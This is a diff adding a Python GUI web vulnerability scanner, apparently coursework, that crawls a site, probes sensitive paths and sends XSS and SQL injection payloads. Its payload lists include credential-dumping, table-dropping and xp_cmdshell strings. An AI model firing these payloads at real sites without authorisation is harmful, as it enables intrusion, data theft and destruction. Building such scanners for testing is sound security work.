@@ -1,0 +1,513 @@
+CourseWork-1
+
+import tkinter as tk
+from tkinter import ttk, scrolledtext
+from urllib.parse import urljoin, urlparse, urlencode
+import requests
+from bs4 import BeautifulSoup
+import threading
+import time
+import pickle
+import os
+import webbrowser
+
+# --- PAYLOADS ---
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<iframe src=javascript:alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<xss onpointerdown=alert(1)> style='display:block;position:relative'>",
+    "<math><mtext onmouseover='alert(1)'>Click me</mtext></math>",
+    "'; alert(1); //",
+    "'\"><script>alert(1)</script>",
+    "<a href=\"javascript:alert(1)\">clickme</a>",
+    "<div onmouseover='alert(1)'>Hover me</div>",
+    "<script>prompt(1)</script>",
+    "<script>console.log('XSS')</script>",
+]
+
+SQLI_PAYLOADS = [
+    "' OR 1=1--",
+    '" OR 1=1--',
+    "') OR ('1'='1",
+    "1' ORDER BY 1--+",
+    "1' ORDER BY 2--+",
+    "1' UNION SELECT null, version()--+",
+    "1' UNION SELECT null, username || '~' || password FROM users--+",
+    "admin' --",
+    "1; DROP TABLE users; --",
+    "1'; EXEC xp_cmdshell('whoami')--",
+    "1' AND GTID_SUBSET(CONCAT(0x7e,USER(),0x7e),1)-- -",
+    "1' AND 1=CAST((SELECT database()) AS INT)--",
+    "1' AND (SELECT COUNT(*) FROM users WHERE user IS NOT NULL)--",
+    "1' AND 1=(SELECT ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)),0))--",
+    "1'/**/AND/**/'1'='1",
+]
+
+FUZZ_PAYLOADS = [
+    ".env",
+    "robots.txt",
+    "backup.sql",
+    ".git/config",
+    ".svn/entries",
+    "phpinfo.php",
+    "upload.php",
+    "shell.php",
+    "db.php",
+    "debug.php"
+]
+
+# --- GLOBAL VARIABLES ---
+scan_active = False
+scan_paused = False
+url_queue = []
+visited = set()
+found_vulns = {
+    "xss": [],
+    "sqli": [],
+    "fuzz": []
+}
+
+ui_elements = {
+    'progress_bar': None,
+    'progress_var': None,
+    'status_label': None,
+    'log_widget': None
+}
+proxy_entry = None
+header_text = None
+
+# --- UTILITY FUNCTIONS ---
+def is_valid_url(url):
+    parsed = urlparse(url)
+    return bool(parsed.netloc) and bool(parsed.scheme)
+
+def log_message(log_widget, message):
+    log_widget.configure(state='normal')
+    log_widget.insert(tk.END, message + "\n")
+    log_widget.configure(state='disabled')
+    log_widget.see(tk.END)
+    log_widget.update_idletasks()
+
+def update_progress(current, total):
+    if total == 0:
+        percent = 0
+    else:
+        percent = (current / total) * 100
+    ui_elements['progress_var'].set(percent)
+    ui_elements['progress_bar'].update()
+    ui_elements['status_label'].config(text=f"Status: Scanning... {percent:.1f}% complete")
+
+def update_status(message):
+    ui_elements['status_label'].config(text=message)
+
+def apply_settings(session, headers_input, proxy_url):
+    headers = {}
+    for line in headers_input.splitlines():
+        if ':' in line:
+            key, val = line.split(':', 1)
+            headers[key.strip()] = val.strip()
+    session.headers.update(headers)
+
+    proxies = {}
+    if proxy_url.strip():
+        proxies = {"http": proxy_url.strip(), "https": proxy_url.strip()}
+    session.proxies.update(proxies)
+
+def save_queue():
+    with open("queue.pkl", "wb") as f:
+        pickle.dump(url_queue, f)
+
+def load_queue():
+    global url_queue
+    if os.path.exists("queue.pkl"):
+        with open("queue.pkl", "rb") as f:
+            url_queue = pickle.load(f)
+
+def clear_queue_file():
+    if os.path.exists("queue.pkl"):
+        os.remove("queue.pkl")
+
+def save_results(results):
+    with open("scan_results.txt", "w") as f:
+        for vuln_type, items in results.items():
+            if items:
+                f.write(f"{vuln_type.upper()} Vulnerabilities:\n")
+                for item in items:
+                    if isinstance(item, tuple):
+                        f.write(f" - {item[0]} (Payload: {item[1]})\n")
+                    else:
+                        f.write(f" - {item}\n")
+                f.write("\n")
+
+# --- CORE SCAN FUNCTIONS ---
+def submit_form(form, url, session, vuln_type, log_widget):
+    global scan_active, scan_paused
+    if not scan_active:
+        return None
+
+    action = form.get("action")
+    method = form.get("method", "get").lower()
+    if method != "get":
+        return None
+
+    target_url = urljoin(url, action)
+    inputs = form.find_all("input")
+    get_data = {}
+
+    modified = False
+    payload_used = ""
+
+    for inp in inputs:
+        name = inp.get("name")
+        value = inp.get("value", "test")
+        if name and not modified:
+            payload_used = XSS_PAYLOADS[0] if vuln_type == "XSS" else SQLI_PAYLOADS[0]
+            value = payload_used
+            modified = True
+        if name:
+            get_data[name] = value
+
+    while scan_paused:
+        time.sleep(0.5)
+        if not scan_active:
+            return None
+
+    try:
+        res = session.get(target_url, params=get_data)
+        used_url = f"{target_url}?{urlencode(get_data)}"
+        if payload_used in res.text:
+            msg = f"[!] {vuln_type} FOUND (GET): {used_url}"
+            log_message(log_widget, msg)
+            found_vulns[vuln_type.lower()].append((used_url, payload_used))
+            return payload_used
+    except Exception as e:
+        log_message(log_widget, f"[-] Error submitting form at {target_url}: {e}")
+    return None
+
+def test_url_params_for_vulns(url, session, log_widget, check_xss=True, check_sqli=True):
+    global scan_active, scan_paused
+    parsed = urlparse(url)
+    if not parsed.query or not scan_active:
+        return
+
+    base_url = url.split('?')[0]
+    try:
+        query_params = dict([p.split('=') for p in parsed.query.split('&')])
+    except ValueError:
+        return
+
+    for param in query_params:
+        if not scan_active:
+            return
+
+        # Wait if paused
+        while scan_paused:
+            time.sleep(0.5)
+            if not scan_active:
+                return
+
+        if check_xss:
+            payload = XSS_PAYLOADS[0]
+            test_params = query_params.copy()
+            test_params[param] = payload
+            test_url = f"{base_url}?{urlencode(test_params)}"
+            try:
+                res = session.get(test_url)
+                if payload in res.text:
+                    msg = f"[!] XSS FOUND (GET): {test_url}"
+                    log_message(log_widget, msg)
+                    found_vulns["xss"].append((test_url, payload))
+            except Exception as e:
+                log_message(log_widget, f"[-] Error testing XSS in URL: {e}")
+
+        if check_sqli:
+            payload = SQLI_PAYLOADS[0]
+            test_params = query_params.copy()
+            test_params[param] = payload
+            test_url = f"{base_url}?{urlencode(test_params)}"
+            try:
+                res = session.get(test_url)
+                error_indicators = ["SQL syntax", "mysql", "error", "syntax", "database"]
+                if any(indicator in res.text.lower() for indicator in error_indicators):
+                    msg = f"[!] SQLi FOUND (GET): {test_url}"
+                    log_message(log_widget, msg)
+                    found_vulns["sqli"].append((test_url, payload))
+            except Exception as e:
+                log_message(log_widget, f"[-] Error testing SQLi in URL: {e}")
+
+def fuzz_urls(base_url, session, log_widget):
+    global scan_active, scan_paused
+    total = len(FUZZ_PAYLOADS)
+    for i, payload in enumerate(FUZZ_PAYLOADS):
+        if not scan_active:
+            return
+        while scan_paused:
+            time.sleep(0.5)
+            if not scan_active:
+                return
+        test_url = urljoin(base_url, payload)
+        try:
+            res = session.get(test_url)
+            if res.status_code == 200:
+                log_message(log_widget, f"[+] FUZZ FOUND: {test_url}")
+                found_vulns["fuzz"].append(test_url)
+        except Exception as e:
+            pass
+        update_progress(i + 1, total)
+
+def crawl_only(url, session, max_depth, current_depth, log_widget):
+    global url_queue, visited, scan_active, scan_paused
+    if current_depth > max_depth or url in visited or not scan_active:
+        return
+
+    log_message(log_widget, f"[*] Crawling: {url}")
+    update_status(f"Crawling: {url}")
+    visited.add(url)
+
+    try:
+        res = session.get(url)
+        soup = BeautifulSoup(res.text, 'lxml')
+    except:
+        return
+
+    for link in soup.find_all("a", href=True):
+        next_url = urljoin(url, link['href'])
+        if is_valid_url(next_url) and urlparse(next_url).netloc == urlparse(url).netloc:
+            if next_url not in visited and (next_url, current_depth + 1) not in url_queue:
+                url_queue.append((next_url, current_depth + 1))
+
+    total_links = len(url_queue) + len(visited)
+    update_progress(len(visited), total_links)
+
+def test_form_vulnerabilities(url, session, log_widget, check_xss=True, check_sqli=True):
+    global scan_active, scan_paused
+    try:
+        res = session.get(url)
+        soup = BeautifulSoup(res.text, 'lxml')
+    except:
+        return
+
+    forms = soup.find_all("form")
+    for form in forms:
+        if not scan_active:
+            return
+        while scan_paused:
+            time.sleep(0.5)
+            if not scan_active:
+                return
+
+        method = form.get("method", "get").lower()
+        if method != "get":
+            continue
+
+        if check_xss:
+            submit_form(form, url, session, "XSS", log_widget)
+        if check_sqli:
+            submit_form(form, url, session, "SQLi", log_widget)
+
+    if check_xss or check_sqli:
+        test_url_params_for_vulns(url, session, log_widget, check_xss, check_sqli)
+
+# --- CONTROL FUNCTIONS ---
+def run_scan(entry_url, entry_depth, x_var, s_var, f_var, log_widget):
+    global scan_active, scan_paused, url_queue, visited
+    scan_active = True
+    scan_paused = False
+
+    start_url = entry_url.get().strip()
+    max_depth = int(entry_depth.get())
+    check_xss = x_var.get()
+    check_sqli = s_var.get()
+    check_fuzz = f_var.get()
+
+    if not is_valid_url(start_url):
+        log_message(log_widget, "[-] Invalid URL.")
+        return
+
+    session = requests.Session()
+
+    # Load settings
+    headers_input = header_text.get("1.0", tk.END).strip()
+    proxy_url = proxy_entry.get().strip()
+    apply_settings(session, headers_input, proxy_url)
+
+    # Reset state
+    visited.clear()
+    url_queue.clear()
+    load_queue()
+    if not url_queue:
+        url_queue = [(start_url, 0)]
+
+    log_message(log_widget, "[*] Starting scan...\n")
+
+    # --- STAGE 1: Path Fuzzing ---
+    if check_fuzz:
+        log_message(log_widget, "[*] === STAGE 1: Path Fuzzing ===")
+        fuzz_urls(start_url, session, log_widget)
+
+    # --- STAGE 2: Crawling Pages ---
+    log_message(log_widget, "[*] === STAGE 2: Crawling Pages ===")
+    while url_queue and scan_active:
+        while scan_paused:
+            time.sleep(0.5)
+            save_queue()
+            log_message(log_widget, "[*] Scan paused. Progress saved.")
+            if not scan_active:
+                save_queue()
+                return
+
+        current_url, depth = url_queue.pop(0)
+        if current_url in visited:
+            continue
+        crawl_only(current_url, session, max_depth, depth, log_widget)
+
+    url_queue.clear()
+    clear_queue_file()
+
+    # --- STAGE 3: Vulnerability Testing ---
+    log_message(log_widget, "[*] === STAGE 3: Vulnerability Testing ===")
+    for url in list(visited):
+        if not scan_active:
+            break
+        while scan_paused:
+            time.sleep(0.5)
+            if not scan_active:
+                return
+        test_form_vulnerabilities(url, session, log_widget, check_xss, check_sqli)
+
+    if scan_active:
+        log_message(log_widget, "[*] Scan completed.")
+    save_results(found_vulns)
+
+def stop_scan(log_widget):
+    global scan_active
+    scan_active = False
+    save_queue()
+    log_message(log_widget, "[!] Scan stopped by user.")
+
+def pause_scan(pause=True, log_widget=None):
+    global scan_paused
+    scan_paused = pause
+    msg = "[*] Scan paused." if pause else "[*] Scan resumed."
+    log_message(log_widget, msg)
+    if pause:
+        save_queue()
+
+def open_in_browser(log_area):
+    text = log_area.get("1.0", tk.END)
+    lines = text.splitlines()
+    for line in reversed(lines):
+        if "(GET):" in line:
+            start = line.find("http")
+            if start != -1:
+                vuln_url = line[start:]
+                webbrowser.open(vuln_url)
+                log_message(log_area, f"[*] Opening GET vulnerability in browser: {vuln_url}")
+                return
+    log_message(log_area, "[*] No GET-based vulnerability found to open.")
+
+# --- GUI SETUP ---
+def create_gui():
+    window = tk.Tk()
+    window.title("Advanced Security Scanner")
+    window.geometry("900x650")
+    window.resizable(True, True)
+
+    style = ttk.Style()
+    style.configure("TButton", padding=6, relief="flat", background="#007BFF", foreground="white", font=("Segoe UI", 10))
+    style.map("TButton", background=[('active', '#0056b3')])
+    style.configure("TCheckbutton", font=("Segoe UI", 10))
+    style.configure("TLabel", font=("Segoe UI", 10))
+    style.configure("TProgressbar", thickness=20)
+
+    tab_control = ttk.Notebook(window)
+
+    tab_main = ttk.Frame(tab_control)
+    tab_settings = ttk.Frame(tab_control)
+    tab_log = ttk.Frame(tab_control)
+
+    tab_control.add(tab_main, text='Scanner')
+    tab_control.add(tab_settings, text='Settings')
+    tab_control.add(tab_log, text='Log')
+
+    tab_control.pack(expand=1, fill='both', padx=10, pady=10)
+
+    # Main Tab
+    control_frame = ttk.LabelFrame(tab_main, text="Scan Options", padding=10)
+    control_frame.pack(fill="x", padx=10, pady=10)
+
+    tk.Label(control_frame, text="Target URL:", font=("Segoe UI", 10)).grid(row=0, column=0, sticky="w", padx=10, pady=5)
+    entry_url = tk.Entry(control_frame, width=50, font=("Segoe UI", 10))
+    entry_url.grid(row=0, column=1, padx=10, pady=5)
+
+    tk.Label(control_frame, text="Crawl Depth:", font=("Segoe UI", 10)).grid(row=1, column=0, sticky="w", padx=10, pady=5)
+    entry_depth = tk.Entry(control_frame, width=10, font=("Segoe UI", 10))
+    entry_depth.insert(0, "2")
+    entry_depth.grid(row=1, column=1, sticky="w", padx=10, pady=5)
+
+    x_var = tk.BooleanVar(value=True)
+    s_var = tk.BooleanVar(value=True)
+    f_var = tk.BooleanVar(value=False)
+
+    ttk.Checkbutton(control_frame, text="Test XSS", variable=x_var).grid(row=2, column=0, sticky="w", padx=10, pady=5)
+    ttk.Checkbutton(control_frame, text="Test SQLi", variable=s_var).grid(row=2, column=1, sticky="w", padx=10, pady=5)
+    ttk.Checkbutton(control_frame, text="Fuzz Paths", variable=f_var).grid(row=3, column=0, sticky="w", padx=10, pady=5)
+
+    btn_frame = ttk.Frame(tab_main)
+    btn_frame.pack(pady=10)
+
+    btn_run = ttk.Button(btn_frame, text="Start Scan", command=lambda: threading.Thread(
+        target=run_scan, args=(entry_url, entry_depth, x_var, s_var, f_var, log_area)).start())
+    btn_run.grid(row=0, column=0, padx=5)
+
+    btn_stop = ttk.Button(btn_frame, text="Stop Scan", command=lambda: stop_scan(log_area))
+    btn_stop.grid(row=0, column=1, padx=5)
+
+    btn_pause = ttk.Button(btn_frame, text="Pause Scan", command=lambda: pause_scan(True, log_area))
+    btn_pause.grid(row=0, column=2, padx=5)
+
+    btn_resume = ttk.Button(btn_frame, text="Resume Scan", command=lambda: pause_scan(False, log_area))
+    btn_resume.grid(row=0, column=3, padx=5)
+
+    btn_open = ttk.Button(btn_frame, text="Open Last Vuln in Browser", command=lambda: open_in_browser(log_area))
+    btn_open.grid(row=0, column=4, padx=5)
+
+    # Progress bar and status label
+    progress_var = tk.DoubleVar()
+    progress_bar = ttk.Progressbar(tab_main, variable=progress_var, maximum=100, length=400, mode='determinate')
+    progress_bar.pack(pady=5)
+
+    status_label = tk.Label(tab_main, text="Status: Waiting to start...", relief=tk.SUNKEN, anchor="w", font=("Segoe UI", 9))
+    status_label.pack(fill='x', padx=10, pady=5)
+
+    # Log Tab
+    log_area = scrolledtext.ScrolledText(tab_log, wrap=tk.WORD, width=100, height=25, state='disabled', font=("Consolas", 9))
+    log_area.pack(padx=10, pady=10)
+
+    # Settings Tab
+    global proxy_entry, header_text
+    ttk.Label(tab_settings, text="Proxy (e.g., http://127.0.0.1:8080):").grid(row=0, column=0, sticky="w", padx=10, pady=5)
+    proxy_entry = tk.Entry(tab_settings, width=40, font=("Segoe UI", 10))
+    proxy_entry.grid(row=0, column=1, padx=10, pady=5)
+
+    ttk.Label(tab_settings, text="Custom Headers (one per line, format: key:value):").grid(
+        row=1, column=0, sticky="w", padx=10, pady=5)
+    header_text = tk.Text(tab_settings, height=6, width=60, wrap="none", font=("Consolas", 10))
+    header_text.grid(row=2, column=0, columnspan=2, padx=10, pady=5)
+
+    # Assign UI elements
+    ui_elements['progress_bar'] = progress_bar
+    ui_elements['progress_var'] = progress_var
+    ui_elements['status_label'] = status_label
+    ui_elements['log_widget'] = log_area
+
+    window.mainloop()
+
+if __name__ == "__main__":
+    create_gui()
